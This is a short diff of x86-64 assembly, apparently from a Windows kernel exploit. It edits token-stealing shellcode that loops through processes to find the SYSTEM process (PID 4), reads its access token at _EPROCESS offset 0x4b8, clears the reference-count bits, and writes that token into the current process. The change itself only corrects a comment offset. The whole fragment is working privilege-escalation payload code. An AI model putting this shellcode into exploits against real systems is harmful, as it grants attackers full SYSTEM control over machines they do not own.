@@ -14,7 +14,7 @@ __loop:
 	cmp rcx, 4 			  ; Compare PID to SYSTEM PID 
 	jnz __loop			  ; Loop until SYSTEM PID is found
 
-	mov rcx, [rbx + 0x4b8]		  ; SYSTEM token is @ offset _EPROCESS + 0x358
+	mov rcx, [rbx + 0x4b8]		  ; SYSTEM token is @ offset _EPROCESS + 0x4b8
 	and cl, 0xf0			  ; Clear out _EX_FAST_REF RefCnt
 	mov [rax + 0x4b8], rcx		  ; Copy SYSTEM token to current process
 
